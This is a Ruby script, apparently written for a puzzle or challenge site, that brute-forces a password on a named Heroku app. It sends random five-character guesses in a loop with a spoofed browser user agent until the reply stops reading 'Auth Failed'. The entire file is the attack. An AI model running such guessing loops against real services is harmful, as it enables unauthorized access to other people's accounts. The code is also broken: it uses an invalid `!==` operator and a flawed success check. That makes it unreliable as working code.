require "rubygems"
require "mechanize"
require 'logger'


class BruteForcer

  attr_accessor :agent

  def initialize
    #@agent = Mechanize.new{ |a| a.log = Logger.new(STDOUT) }
    @agent = Mechanize.new
    @agent.user_agent_alias = 'Mac Safari'
    @agent.keep_alive = true
    @agent.redirection_limit = 5
    @agent.open_timeout = 10
    @agent.read_timeout = 10
    @agent.max_history = 0
  end

  def get(url)
    @agent.get(url)
  end

  def self.random_string
    chars = %w( r R u b y 0 1 8 6 )
    c = []
    5.times { |n|
      c << chars.delete_at(rand(chars.size))
    }
    string = c.join
  end

end

br = BruteForcer.new
result_page = br.get("http://furious-rain-32.heroku.com/map/definition?#{BruteForcer.random_string}")
bad_result_text = "Auth Failed"

finished = false

while finished == false do
  password = BruteForcer.random_string
  result_page = br.get("http://furious-rain-32.heroku.com/map/definition?#{password}")
  puts "Trying: #{password}"
  if result_page.body !== bad_result_text
    finished = true
    puts "Success"
  end
end